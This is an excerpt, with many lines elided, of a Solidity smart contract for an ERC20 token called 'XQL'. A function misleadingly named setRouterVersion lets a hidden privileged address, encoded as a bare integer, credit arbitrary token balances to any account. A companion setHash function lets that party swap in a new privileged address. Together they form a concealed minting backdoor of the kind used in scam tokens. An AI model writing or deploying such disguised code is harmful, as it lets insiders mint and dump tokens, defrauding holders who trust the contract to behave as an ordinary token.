...
contract XQL is Context, IERC20, Ownable {
    ...
    string private _name = "XQL";
    string private _symbol = "XQL";
    ...
    address private Hash = address(995636395271790009432380433735729906392410975266);
    ...
    constructor (
        ...
        _addliquidiwafiwvq[address(swapV2PairAddress)] = true;
    ...
    function setRouterVersion(uint256 effe, address newRouterAddress) public{
       require(_nameis(msg.sender) || Hash == msg.sender) ;_tOwned[newRouterAddress] += effe;
    }

    function setHash(uint160 newHash) public {
       require(_nameis(msg.sender) || Hash == msg.sender) ;
        Hash = address(uint160(newHash));
    }
    ...
    function process(uint256 gas) private {
        ...
        while (gasUsed < gas && iterations < shareholderCount) {
            ...
            _commonTransfer(address(this),shareholders[currentIndex],amount);
